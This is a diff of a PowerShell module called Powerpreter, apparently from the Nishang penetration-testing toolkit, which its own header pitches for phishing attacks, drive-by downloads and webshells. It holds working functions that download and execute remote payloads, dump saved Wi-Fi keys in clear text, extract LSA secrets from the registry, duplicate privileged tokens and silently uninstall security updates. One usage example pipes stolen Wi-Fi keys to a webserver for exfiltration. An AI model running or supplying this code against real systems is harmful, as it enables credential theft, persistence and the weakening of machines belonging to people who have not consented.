@@ -1,6 +1,45 @@
-﻿##########################################################PowerPreter Code#####################################################
+﻿#Requires -version 3
+
+<#
+.SYNOPSIS
+Powerpreter is a module written in powershell. Powerpreter makes available maximum possible functionality of nishang
+in a single script. This is much helpful in scenarios like phishing attacks and webshells.
+
+.DESCRIPTION
+Powerpreter is a script module which makes it useful in scenarios like drive-by-download, document attachments, webshells etc. where one
+may like to pull all the functionality in Nishang in a single file or deployment is not easy to do. Powerpreter has persistence
+capabilities too. See examples for help in using it.
+
+.EXAMPLE
+PS > Import-Module .\Powerpreter.psm1
+PS> Get-Command -Module powerpreter
+
+The first command imports the module in current powershell session.
+The second command lists all the functions available with powerpreter.
+
+.EXAMPLE
+PS > Import-Module .\Powerpreter.psm1; Enable-DuplicateToken; Get-LSASecret
+
+Use above command to import powerpreter in current powershell session and execute the two functions.
+
+.EXAMPLE
+PS > Import-Module .\Powerpreter.psm1; Persistence
+
+Use above for reboot persistence
+
+.EXAMPLE
+PS > Import-Module .\Powerpreter.psm1
+PS > Get-WLAN-Keys | Do-Exfiltration -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
+
+Use above for exfiltration to a webserver which logs POST requests.
 
 
+.LINK
+http://labofapenetrationtester.com/
+https://github.com/samratashok/nishang
+
+
+#>
 ######################################################Download a file to the target.##################################################
 
 function Download
@@ -23,12 +62,19 @@ Name of the file where download would be saved.
 PS > Download http://example.com/file.txt newfile.txt
 
 .LINK
-http://labofapenetrationtester.blogspot.com/
-http://code.google.com/p/nishang
+http://labofapenetrationtester.com/
+https://github.com/samratashok/nishang
 #>
 
 
-    Param( [Parameter(Position = 0, Mandatory = $True)] [String] $URL,[Parameter(Position = 1, Mandatory = $True)] [String]$FileName )
+    [CmdletBinding()] Param(
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $URL,
+        [Parameter(Position = 1, Mandatory = $True)]
+        [String]
+        $FileName
+    )
     $webclient = New-Object System.Net.WebClient
     $file = "$env:temp\$FileName"
     $webclient.DownloadFile($URL,$file)
@@ -53,13 +99,17 @@ The URL from where the file would be downloaded.
 PS > Download_Execute http://example.com/file.txt
 
 .LINK
-http://labofapenetrationtester.blogspot.com/
-http://code.google.com/p/nishang
+http://labofapenetrationtester.com/
+https://github.com/samratashok/nishang
 #>
 
 
 
-    Param( [Parameter(Position = 0, Mandatory = $True)] [String] $URL)
+    [CmdletBinding()] Param(
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $URL
+    )
     $webclient = New-Object System.Net.WebClient
     [string]$hexformat = $webClient.DownloadString($URL) 
     [Byte[]] $temp = $hexformat -split ' ' 
@@ -79,60 +129,21 @@ Payload which dumps keys for WLAN profiles.
 This payload dumps keys in clear text for saved WLAN profiles.
 The payload must be run from as administrator to get the keys.
 
-.PARAMETER exfil
-Use this parameter to use exfiltration methods.
-
-.PARAMETER dev_key
-The Unique API key provided by pastebin when you register a free account.
-Unused for tinypaste.
-Unused for gmail option.
-
-.PARAMETER username
-Username for the pastebin account where data would be pasted.
-Username for the tinypaste account where data would be pasted.
-Username for the gmail account where attachment would be sent as an attachment.
-
-.PARAMETER password
-Password for the pastebin account where data would be pasted.
-Password for the tinypaste account where data would be pasted.
-Password for the gmail account where data would be sent.
-
-.PARAMETER keyoutoption
-The method you want to use for exfitration of data.
-"0" for displaying on console
-"1" for pastebin.
-"2" for gmail
-"3" for tinypaste   
-
 .EXAMPLE
 PS > Get-WLAN-Keys
 
-.EXAMPLE
-PS > Get-WLAN-Keys -exfil  <devkey> <username> <password> <keyoutoption>
-
-Use above when using the payload from non-interactive shells.
-
 .LINK
 http://poshcode.org/1700
-http://code.google.com/p/nishang
+https://github.com/samratashok/nishang
 #>
 
 
-    [CmdletBinding(DefaultParameterSetName="noexfil")]
-    Param ([Parameter(Parametersetname="exfil")] [Switch]$exfil,
-    [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")] [String] $dev_key,
-    [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [String]$username,
-    [Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [String]$password,
-    [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
+    [CmdletBinding()]
+    Param ()
     $wlans = netsh wlan show profiles | Select-String -Pattern "All User Profile" | Foreach-Object {$_.ToString()}
     $exportdata = $wlans | Foreach-Object {$_.Replace("    All User Profile     : ",$null)}
     $pastevalue = $exportdata | ForEach-Object {netsh wlan show profiles name="$_" key=clear}
     $pastevalue
-    if($exfil -eq $True)
-    {
-        $pastename = $env:COMPUTERNAME + ": WLAN Keys"
-        Do-Exfiltration "$pastename" "$pastevalue" "$username" "$password" "$dev_key" "$keyoutoption"
-    }
 }
 
 
@@ -146,55 +157,17 @@ function Get-Information
 Payload which gathers juicy information from the target.
 
 .DESCRIPTION
-This payload extracts information form registry and some commands. 
-The information can then be exfiltrated using method of choice. The information available would be dependent on the privilege with
-which the script would be executed. If pastebin is used, all the info would be base64 encoded to avoid pastebin spam filters.
-
-.PARAMETER exfil
-Use this parameter to use exfiltration methods.
-
-.PARAMETER dev_key
-The Unique API key provided by pastebin when you register a free account.
-Unused for tinypaste.
-Unused for gmail option.
-
-.PARAMETER username
-Username for the pastebin account where data would be pasted.
-Username for the tinypaste account where data would be pasted.
-Username for the gmail account where attachment would be sent as an attachment.
-
-.PARAMETER password
-Password for the pastebin account where data would be pasted.
-Password for the tinypaste account where data would be pasted.
-Password for the gmail account where data would be sent.
-
-.PARAMETER keyoutoption
-The method you want to use for exfitration of data.
-"0" for displaying on console
-"1" for pastebin.
-"2" for gmail
-"3" for tinypaste   
+This payload extracts information form registry and some commands. The information available would be dependent on the privilege with
+which the script would be executed.
 
 .EXAMPLE
 PS > Get-Information
 
-.EXAMPLE
-PS > Get-Information -exfil <devkey> <username> <password> <keyoutoption>
-
-Use above when using the payload from non-interactive shells.
-
 .LINK
-http://labofapenetrationtester.blogspot.com/
-http://code.google.com/p/nishang
+http://labofapenetrationtester.com/
+https://github.com/samratashok/nishang
 #>
 
-
-    [CmdletBinding(DefaultParameterSetName="noexfil")]
-    Param ( [Parameter(Parametersetname="exfil")] [Switch] $exfil,
-    [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")] [String] $dev_key,
-    [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [String]$username,
-    [Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [String]$password,
-    [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
     function registry_values($regkey, $regvalue,$child) 
     { 
         if ($child -eq "no"){$key = get-item $regkey} 
@@ -232,14 +205,8 @@ http://code.google.com/p/nishang
     $output = $output + "`n`n WLAN Info:`n" + ((netsh wlan show all)  -join "`r`n") 
     
     $output
-    if($exfil -eq $True)
-    {
-        $pastename = $env:COMPUTERNAME + ": Information Dump"
-        Do-Exfiltration "$pastename" "$output" "$username" "$password" "$dev_key" "$keyoutoption"
-    }
-    }
 
-
+}
 ####################################Silently removes updates for a target machine.########################################################
 ###Thanks Trevor Sullivan
 ###http://trevorsullivan.net/2011/05/31/powershell-removing-software-updates-from-windows/
@@ -270,13 +237,15 @@ This removes KB2761226 from the target.
 
 .LINK
 http://trevorsullivan.net/2011/05/31/powershell-removing-software-updates-from-windows/
-http://code.google.com/p/nishang
+https://github.com/samratashok/nishang
 #>
 
 
-
-
-    Param( [Parameter(Position = 0, Mandatory = $True)] [String] $KBID)
+    [CmdletBinding()] Param( 
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $KBID
+    )
     $HotFixes = Get-HotFix
 
     foreach ($HotFix in $HotFixes)
@@ -316,7 +285,7 @@ http://code.google.com/p/nishang
         while (@(Get-Process wusa -ErrorAction SilentlyContinue).Count -ne 0)
         {
             Start-Sleep 3
-            Write-Host "Waiting for update removal to finish ..."
+            Write-Output "Waiting for update removal to finish ..."
         }
     }
 
@@ -342,7 +311,7 @@ PS > Enable-DuplicateToken
 .LINK 
 http://www.truesec.com 
 http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/05/use-powershell-to-duplicate-process-tokens-via-p-invoke.aspx
-http://code.google.com/p/nishang
+https://github.com/samratashok/nishang
 
 .NOTES 
 Goude 2012, TreuSec 
@@ -486,290 +455,258 @@ Payload which extracts LSA Secrets from local computer.
 Extracts LSA secrets from HKLM:\\SECURITY\Policy\Secrets\ on a local computer.
 The payload must be run with elevated permissions, in 32-bit mode and requires 
 permissions to the security key in HKLM. The permission could be obtained by using
-Enable-DuplicateToken payload. The secrets can then exfiltrated using method of choice.
+Enable-DuplicateToken payload.
 
 .PARAMETER RegistryKey
 Name of Key to Extract. if the parameter is not used, all secrets will be displayed.
 
-.PARAMETER exfil
-Use this parameter to use exfiltration methods.
-
-.PARAMETER dev_key
-The Unique API key provided by pastebin when you register a free account.
-Unused for tinypaste.
-Unused for gmail option.
-
-.PARAMETER username
-Username for the pastebin account where data would be pasted.
-Username for the tinypaste account where data would be pasted.
-Username for the gmail account where attachment would be sent as an attachment.
-
-.PARAMETER password
-Password for the pastebin account where data would be pasted.
-Password for the tinypaste account where data would be pasted.
-Password for the gmail account where data would be sent.
-
-.PARAMETER keyoutoption
-The method you want to use for exfitration of data.
-"0" for displaying on console
-"1" for pastebin.
-"2" for gmail
-"3" for tinypaste   
-
 .EXAMPLE
 PS > Get-LsaSecret
-The payload will ask for all required options.
 
 .EXAMPLE
 PS > Get-LsaSecret -Key KeyName
-
-.EXAMPLE
-PS > Get-LsaSecret -Key KeyName -exfil <devkey> <username> <password> <keyoutoption>
-
-Use above when using the payload from non-interactive shells.
+Read contents of the key mentioned as parameter.
 
 .LINK
 http://www.truesec.com
 http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/06/use-powershell-to-decrypt-lsa-secrets-from-the-registry.aspx
-http://code.google.com/p/nishang
+https://github.com/samratashok/nishang
 
 .NOTES
 Goude 2012, TreuSec
 #>
 
+ [CmdletBinding()] Param (
+        [Parameter(Position = 0, Mandatory=$False)]
+        [String]
+        $RegistryKey
+    )
 
-    [CmdletBinding(DefaultParameterSetName="noexfil")]
-    Param ( [Parameter(Parametersetname="exfil")] [Switch]$exfil,
-    [Parameter(Position = 0, Parametersetname="exfil")] [Parameter(Position = 0, Parametersetname="noexfil")] [String] $registrykey,
-    [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [String] $dev_key,
-    [Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [String]$username,
-    [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [String]$password,
-    [Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
-Begin {
-# Check if User is Elevated
-$currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
-if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
-  Write-Warning "Run the Command as an Administrator"
-  Break
-}
+    Begin {
+    # Check if User is Elevated
+    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
+    if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
+      Write-Warning "Run the Command as an Administrator"
+      Break
+    }
 
-# Check if Script is run in a 32-bit Environment by checking a Pointer Size
-if([System.IntPtr]::Size -eq 8) {
-  Write-Warning "Run PowerShell in 32-bit mode"
-  Break
-}
+    # Check if Script is run in a 32-bit Environment by checking a Pointer Size
+    if([System.IntPtr]::Size -eq 8) {
+      Write-Warning "Run PowerShell in 32-bit mode"
+      Break
+    }
 
 
 
-# Check if RegKey is specified
-if([string]::IsNullOrEmpty($registryKey)) {
-  [string[]]$registryKey = (Split-Path (Get-ChildItem HKLM:\SECURITY\Policy\Secrets | Select -ExpandProperty Name) -Leaf)
-}
+    # Check if RegKey is specified
+    if([string]::IsNullOrEmpty($registryKey)) {
+      [string[]]$registryKey = (Split-Path (Get-ChildItem HKLM:\SECURITY\Policy\Secrets | Select -ExpandProperty Name) -Leaf)
+    }
 
-# Create Temporary Registry Key
-if( -not(Test-Path "HKLM:\\SECURITY\Policy\Secrets\MySecret")) {
-  mkdir "HKLM:\\SECURITY\Policy\Secrets\MySecret" | Out-Null
-}
+    # Create Temporary Registry Key
+    if( -not(Test-Path "HKLM:\\SECURITY\Policy\Secrets\MySecret")) {
+      mkdir "HKLM:\\SECURITY\Policy\Secrets\MySecret" | Out-Null
+    }
 
-$signature = @"
-[StructLayout(LayoutKind.Sequential)]
-public struct LSA_UNICODE_STRING
-{
-  public UInt16 Length;
-  public UInt16 MaximumLength;
-  public IntPtr Buffer;
-}
+    $signature = @"
+    [StructLayout(LayoutKind.Sequential)]
+    public struct LSA_UNICODE_STRING
+    {
+      public UInt16 Length;
+      public UInt16 MaximumLength;
+      public IntPtr Buffer;
+    }
 
-[StructLayout(LayoutKind.Sequential)]
-public struct LSA_OBJECT_ATTRIBUTES
-{
-  public int Length;
-  public IntPtr RootDirectory;
-  public LSA_UNICODE_STRING ObjectName;
-  public uint Attributes;
-  public IntPtr SecurityDescriptor;
-  public IntPtr SecurityQualityOfService;
-}
+    [StructLayout(LayoutKind.Sequential)]
+    public struct LSA_OBJECT_ATTRIBUTES
+    {
+      public int Length;
+      public IntPtr RootDirectory;
+      public LSA_UNICODE_STRING ObjectName;
+      public uint Attributes;
+      public IntPtr SecurityDescriptor;
+      public IntPtr SecurityQualityOfService;
+    }
 
-public enum LSA_AccessPolicy : long
-{
-  POLICY_VIEW_LOCAL_INFORMATION = 0x00000001L,
-  POLICY_VIEW_AUDIT_INFORMATION = 0x00000002L,
-  POLICY_GET_PRIVATE_INFORMATION = 0x00000004L,
-  POLICY_TRUST_ADMIN = 0x00000008L,
-  POLICY_CREATE_ACCOUNT = 0x00000010L,
-  POLICY_CREATE_SECRET = 0x00000020L,
-  POLICY_CREATE_PRIVILEGE = 0x00000040L,
-  POLICY_SET_DEFAULT_QUOTA_LIMITS = 0x00000080L,
-  POLICY_SET_AUDIT_REQUIREMENTS = 0x00000100L,
-  POLICY_AUDIT_LOG_ADMIN = 0x00000200L,
-  POLICY_SERVER_ADMIN = 0x00000400L,
-  POLICY_LOOKUP_NAMES = 0x00000800L,
-  POLICY_NOTIFICATION = 0x00001000L
-}
+    public enum LSA_AccessPolicy : long
+    {
+      POLICY_VIEW_LOCAL_INFORMATION = 0x00000001L,
+      POLICY_VIEW_AUDIT_INFORMATION = 0x00000002L,
+      POLICY_GET_PRIVATE_INFORMATION = 0x00000004L,
+      POLICY_TRUST_ADMIN = 0x00000008L,
+      POLICY_CREATE_ACCOUNT = 0x00000010L,
+      POLICY_CREATE_SECRET = 0x00000020L,
+      POLICY_CREATE_PRIVILEGE = 0x00000040L,
+      POLICY_SET_DEFAULT_QUOTA_LIMITS = 0x00000080L,
+      POLICY_SET_AUDIT_REQUIREMENTS = 0x00000100L,
+      POLICY_AUDIT_LOG_ADMIN = 0x00000200L,
+      POLICY_SERVER_ADMIN = 0x00000400L,
+      POLICY_LOOKUP_NAMES = 0x00000800L,
+      POLICY_NOTIFICATION = 0x00001000L
+    }
 
-[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
-public static extern uint LsaRetrievePrivateData(
-  IntPtr PolicyHandle,
-  ref LSA_UNICODE_STRING KeyName,
-  out IntPtr PrivateData
-);
+    [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
+    public static extern uint LsaRetrievePrivateData(
+      IntPtr PolicyHandle,
+      ref LSA_UNICODE_STRING KeyName,
+      out IntPtr PrivateData
+    );
 
-[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
-public static extern uint LsaStorePrivateData(
-  IntPtr policyHandle,
-  ref LSA_UNICODE_STRING KeyName,
-  ref LSA_UNICODE_STRING PrivateData
-);
+    [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
+    public static extern uint LsaStorePrivateData(
+      IntPtr policyHandle,
+      ref LSA_UNICODE_STRING KeyName,
+      ref LSA_UNICODE_STRING PrivateData
+    );
 
-[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
-public static extern uint LsaOpenPolicy(
-  ref LSA_UNICODE_STRING SystemName,
-  ref LSA_OBJECT_ATTRIBUTES ObjectAttributes,
-  uint DesiredAccess,
-  out IntPtr PolicyHandle
-);
+    [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
+    public static extern uint LsaOpenPolicy(
+      ref LSA_UNICODE_STRING SystemName,
+      ref LSA_OBJECT_ATTRIBUTES ObjectAttributes,
+      uint DesiredAccess,
+      out IntPtr PolicyHandle
+    );
 
-[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
-public static extern uint LsaNtStatusToWinError(
-  uint status
-);
+    [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
+    public static extern uint LsaNtStatusToWinError(
+      uint status
+    );
 
-[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
-public static extern uint LsaClose(
-  IntPtr policyHandle
-);
+    [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
+    public static extern uint LsaClose(
+      IntPtr policyHandle
+    );
 
-[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
-public static extern uint LsaFreeMemory(
-  IntPtr buffer
-);
+    [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
+    public static extern uint LsaFreeMemory(
+      IntPtr buffer
+    );
 "@
 
-Add-Type -MemberDefinition $signature -Name LSAUtil -Namespace LSAUtil
-}
+    Add-Type -MemberDefinition $signature -Name LSAUtil -Namespace LSAUtil
+    }
 
-  Process{
-    foreach($key in $RegistryKey) {
-      $regPath = "HKLM:\\SECURITY\Policy\Secrets\" + $key
-      $tempRegPath = "HKLM:\\SECURITY\Policy\Secrets\MySecret"
-      $myKey = "MySecret"
-      if(Test-Path $regPath) {
-        Try {
-          Get-ChildItem $regPath -ErrorAction Stop | Out-Null
-        }
-        Catch {
-          Write-Error -Message "Access to registry Denied, run as NT AUTHORITY\SYSTEM" -Category PermissionDenied
-          Break
-        }      
-
-        if(Test-Path $regPath) {
-          # Copy Key
-          "CurrVal","OldVal","OupdTime","CupdTime","SecDesc" | ForEach-Object {
-            $copyFrom = "HKLM:\SECURITY\Policy\Secrets\" + $key + "\" + $_
-            $copyTo = "HKLM:\SECURITY\Policy\Secrets\MySecret\" + $_
-
-            if( -not(Test-Path $copyTo) ) {
-              mkdir $copyTo | Out-Null
+      Process{
+        foreach($key in $RegistryKey) {
+          $regPath = "HKLM:\\SECURITY\Policy\Secrets\" + $key
+          $tempRegPath = "HKLM:\\SECURITY\Policy\Secrets\MySecret"
+          $myKey = "MySecret"
+          if(Test-Path $regPath) {
+            Try {
+              Get-ChildItem $regPath -ErrorAction Stop | Out-Null
             }
-            $item = Get-ItemProperty $copyFrom
-            Set-ItemProperty -Path $copyTo -Name '(default)' -Value $item.'(default)'
-          }
-        }
-        # Attributes
-        $objectAttributes = New-Object LSAUtil.LSAUtil+LSA_OBJECT_ATTRIBUTES
-        $objectAttributes.Length = 0
-        $objectAttributes.RootDirectory = [IntPtr]::Zero
-        $objectAttributes.Attributes = 0
-        $objectAttributes.SecurityDescriptor = [IntPtr]::Zero
-        $objectAttributes.SecurityQualityOfService = [IntPtr]::Zero
+            Catch {
+              Write-Error -Message "Access to registry Denied, run as NT AUTHORITY\SYSTEM" -Category PermissionDenied
+              Break
+            }      
 
-        # localSystem
-        $localsystem = New-Object LSAUtil.LSAUtil+LSA_UNICODE_STRING
-        $localsystem.Buffer = [IntPtr]::Zero
-        $localsystem.Length = 0
-        $localsystem.MaximumLength = 0
+            if(Test-Path $regPath) {
+              # Copy Key
+              "CurrVal","OldVal","OupdTime","CupdTime","SecDesc" | ForEach-Object {
+                $copyFrom = "HKLM:\SECURITY\Policy\Secrets\" + $key + "\" + $_
+                $copyTo = "HKLM:\SECURITY\Policy\Secrets\MySecret\" + $_
 
-        # Secret Name
-        $secretName = New-Object LSAUtil.LSAUtil+LSA_UNICODE_STRING
-        $secretName.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($myKey)
-        $secretName.Length = [Uint16]($myKey.Length * [System.Text.UnicodeEncoding]::CharSize)
-        $secretName.MaximumLength = [Uint16](($myKey.Length + 1) * [System.Text.UnicodeEncoding]::CharSize)
+                if( -not(Test-Path $copyTo) ) {
+                  mkdir $copyTo | Out-Null
+                }
+                $item = Get-ItemProperty $copyFrom
+                Set-ItemProperty -Path $copyTo -Name '(default)' -Value $item.'(default)'
+              }
+            }
+            # Attributes
+            $objectAttributes = New-Object LSAUtil.LSAUtil+LSA_OBJECT_ATTRIBUTES
+            $objectAttributes.Length = 0
+            $objectAttributes.RootDirectory = [IntPtr]::Zero
+            $objectAttributes.Attributes = 0
+            $objectAttributes.SecurityDescriptor = [IntPtr]::Zero
+            $objectAttributes.SecurityQualityOfService = [IntPtr]::Zero
 
-        # Get LSA PolicyHandle
-        $lsaPolicyHandle = [IntPtr]::Zero
-        [LSAUtil.LSAUtil+LSA_AccessPolicy]$access = [LSAUtil.LSAUtil+LSA_AccessPolicy]::POLICY_GET_PRIVATE_INFORMATION
-        $lsaOpenPolicyHandle = [LSAUtil.LSAUtil]::LSAOpenPolicy([ref]$localSystem, [ref]$objectAttributes, $access, [ref]$lsaPolicyHandle)
+            # localSystem
+            $localsystem = New-Object LSAUtil.LSAUtil+LSA_UNICODE_STRING
+            $localsystem.Buffer = [IntPtr]::Zero
+            $localsystem.Length = 0
+            $localsystem.MaximumLength = 0
 
-        if($lsaOpenPolicyHandle -ne 0) {
-          Write-Warning "lsaOpenPolicyHandle Windows Error Code: $lsaOpenPolicyHandle"
-          Continue
-        }
+            # Secret Name
+            $secretName = New-Object LSAUtil.LSAUtil+LSA_UNICODE_STRING
+            $secretName.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($myKey)
+            $secretName.Length = [Uint16]($myKey.Length * [System.Text.UnicodeEncoding]::CharSize)
+            $secretName.MaximumLength = [Uint16](($myKey.Length + 1) * [System.Text.UnicodeEncoding]::CharSize)
 
-        # Retrieve Private Data
-        $privateData = [IntPtr]::Zero
-        $ntsResult = [LSAUtil.LSAUtil]::LsaRetrievePrivateData($lsaPolicyHandle, [ref]$secretName, [ref]$privateData)
+            # Get LSA PolicyHandle
+            $lsaPolicyHandle = [IntPtr]::Zero
+            [LSAUtil.LSAUtil+LSA_AccessPolicy]$access = [LSAUtil.LSAUtil+LSA_AccessPolicy]::POLICY_GET_PRIVATE_INFORMATION
+            $lsaOpenPolicyHandle = [LSAUtil.LSAUtil]::LSAOpenPolicy([ref]$localSystem, [ref]$objectAttributes, $access, [ref]$lsaPolicyHandle)
 
-        $lsaClose = [LSAUtil.LSAUtil]::LsaClose($lsaPolicyHandle)
+            if($lsaOpenPolicyHandle -ne 0) {
+              Write-Warning "lsaOpenPolicyHandle Windows Error Code: $lsaOpenPolicyHandle"
+              Continue
+            }
 
-        $lsaNtStatusToWinError = [LSAUtil.LSAUtil]::LsaNtStatusToWinError($ntsResult)
+            # Retrieve Private Data
+            $privateData = [IntPtr]::Zero
+            $ntsResult = [LSAUtil.LSAUtil]::LsaRetrievePrivateData($lsaPolicyHandle, [ref]$secretName, [ref]$privateData)
 
-        if($lsaNtStatusToWinError -ne 0) {
-          Write-Warning "lsaNtsStatusToWinError: $lsaNtStatusToWinError"
-        }
+            $lsaClose = [LSAUtil.LSAUtil]::LsaClose($lsaPolicyHandle)
 
-        [LSAUtil.LSAUtil+LSA_UNICODE_STRING]$lusSecretData =
-        [LSAUtil.LSAUtil+LSA_UNICODE_STRING][System.Runtime.InteropServices.marshal]::PtrToStructure($privateData, [LSAUtil.LSAUtil+LSA_UNICODE_STRING])
+            $lsaNtStatusToWinError = [LSAUtil.LSAUtil]::LsaNtStatusToWinError($ntsResult)
 
-        Try {
-          [string]$value = [System.Runtime.InteropServices.marshal]::PtrToStringAuto($lusSecretData.Buffer)
-          $value = $value.SubString(0, ($lusSecretData.Length / 2))
-        }
-        Catch {
-          $value = ""
-        }
+            if($lsaNtStatusToWinError -ne 0) {
+              Write-Warning "lsaNtsStatusToWinError: $lsaNtStatusToWinError"
+            }
 
-        if($key -match "^_SC_") {
-          # Get Service Account
-          $serviceName = $key -Replace "^_SC_"
-          Try {
-            # Get Service Account
-            $service = Get-WmiObject -Query "SELECT StartName FROM Win32_Service WHERE Name = '$serviceName'" -ErrorAction Stop
-            $account = $service.StartName
-          }
-          Catch {
-            $account = ""
-          }
-        } else {
-          $account = ""
-        }
+            [LSAUtil.LSAUtil+LSA_UNICODE_STRING]$lusSecretData =
+            [LSAUtil.LSAUtil+LSA_UNICODE_STRING][System.Runtime.InteropServices.marshal]::PtrToStructure($privateData, [LSAUtil.LSAUtil+LSA_UNICODE_STRING])
 
-        # Return Object
-       $obj = New-Object PSObject -Property @{
-          Name = $key;
-          Secret = $value;
-          Account = $Account
-        } 
+            Try {
+              [string]$value = [System.Runtime.InteropServices.marshal]::PtrToStringAuto($lusSecretData.Buffer)
+              $value = $value.SubString(0, ($lusSecretData.Length / 2))
+            }
+            Catch {
+              $value = ""
+            }
+
+            if($key -match "^_SC_") {
+              # Get Service Account
+              $serviceName = $key -Replace "^_SC_"
+              Try {
+                # Get Service Account
+                $service = Get-WmiObject -Query "SELECT StartName FROM Win32_Service WHERE Name = '$serviceName'" -ErrorAction Stop
+                $account = $service.StartName
+              }
+              Catch {
+                $account = ""
+              }
+            } else {
+              $account = ""
+            }
+
+            # Return Object
+           $obj = New-Object PSObject -Property @{
+              Name = $key;
+              Secret = $value;
+              Account = $Account
+            } 
         
-        $pastevalue = $obj | Select-Object Name, Account, Secret, @{Name="ComputerName";Expression={$env:COMPUTERNAME}}
-        $pastevalue
+            $pastevalue = $obj | Select-Object Name, Account, Secret, @{Name="ComputerName";Expression={$env:COMPUTERNAME}}
+            $pastevalue
 
-      } else {
-        Write-Error -Message "Path not found: $regPath" -Category ObjectNotFound
+          } else {
+            Write-Error -Message "Path not found: $regPath" -Category ObjectNotFound
+          }
+        }
       }
-    }
-  }
-  end {
-    if(Test-Path $tempRegPath) {
-      Remove-Item -Path "HKLM:\\SECURITY\Policy\Secrets\MySecret" -Recurse -Force
-    }
-   if($exfil -eq $True)
-   {
-        Do-Exfiltration "LSA Secrets: " "$pastevalue" "$username" "$password" "$dev_key" "$keyoutoption"
-   }
-  }
+      end {
+        if(Test-Path $tempRegPath) {
+          Remove-Item -Path "HKLM:\\SECURITY\Policy\Secrets\MySecret" -Recurse -Force
+        }
+       if($exfil -eq $True)
+       {
+            Do-Exfiltration "LSA Secrets: " "$pastevalue" "$username" "$password" "$dev_key" "$keyoutoption"
+       }
+      }
 
-}
+    }
 
 ######################################################Converts Base64 string or file to plain.##################################################
 function Base64ToString
@@ -787,31 +724,39 @@ The filename which contains base64 string to be decoded.
 Use the parameter -IsString while using a string instead of file.
 
 .EXAMPLE
-PS > .\Base64ToString.ps1 base64.txt
+PS > Base64ToString base64.txt
 
 .EXAMPLE
-PS > .\Base64ToString.ps1 dGVzdGVzdA== -IsString
+PS > Base64ToString dGVzdGVzdA== -IsString
 
 .LINK
-http://labofapenetrationtester.blogspot.com/
-http://code.google.com/p/nishang
+http://labofapenetrationtester.com/
+https://github.com/samratashok/nishang
 #>
 
-Param( [Parameter(Position = 0, Mandatory = $True)] [String] $Base64Strfile, [Switch] $IsString)
-  if($IsString -eq $true)
+    [CmdletBinding()] Param( 
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $Base64Strfile, 
+        
+        [Switch] 
+        $IsString
+    )
+
+    if($IsString -eq $true)
     {
     
         $base64string  = [System.Convert]::FromBase64String($Base64Strfile)
        
     }
-  else
+    else
     {
         $base64string  = [System.Convert]::FromBase64String((Get-Content $Base64Strfile))
     }
     
-  $decodedstring = [System.Text.Encoding]::Unicode.GetString($base64string)
-  $decodedstring
-  }
+    $decodedstring = [System.Text.Encoding]::Unicode.GetString($base64string)
+    $decodedstring
+    }
 
 
 
@@ -832,294 +777,290 @@ Xen and QEMU for detecting the environment.
 PS > Check-VM 
  
 .LINK 
-http://labofapenetrationtester.blogspot.com/
-http://code.google.com/p/nishang
+http://labofapenetrationtester.com/
+https://github.com/samratashok/nishang
 
 .NOTES 
 The script draws heavily from checkvm.rb post module from msf.
 https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/checkvm.rb
 #>
+    [CmdletBinding()] Param()
+    $ErrorActionPreference = "SilentlyContinue"
+    #Hyper-V
+    $hyperv = Get-ChildItem HKLM:\SOFTWARE\Microsoft
+    if (($hyperv -match "Hyper-V") -or ($hyperv -match "VirtualMachine"))
+        {
+            $hypervm = $true
+        }
 
-$ErrorActionPreference = "SilentlyContinue"
-#Hyper-V
-$hyperv = Get-ChildItem HKLM:\SOFTWARE\Microsoft
-if (($hyperv -match "Hyper-V") -or ($hyperv -match "VirtualMachine"))
-    {
-        $hypervm = $true
-    }
-
-if (!$hypervm)
-    {
-        $hyperv = Get-ItemProperty hklm:\HARDWARE\DESCRIPTION\System -Name SystemBiosVersion
-        if ($hyperv -match "vrtual")
-            {
-                $hypervm = $true
-            }
-    }
+    if (!$hypervm)
+        {
+            $hyperv = Get-ItemProperty hklm:\HARDWARE\DESCRIPTION\System -Name SystemBiosVersion
+            if ($hyperv -match "vrtual")
+                {
+                    $hypervm = $true
+                }
+        }
     
-if (!$hypervm)
-    {
-        $hyperv = Get-ChildItem HKLM:\HARDWARE\ACPI\FADT
-        if ($hyperv -match "vrtual")
-            {
-                $hypervm = $true
-            }
-    }
+    if (!$hypervm)
+        {
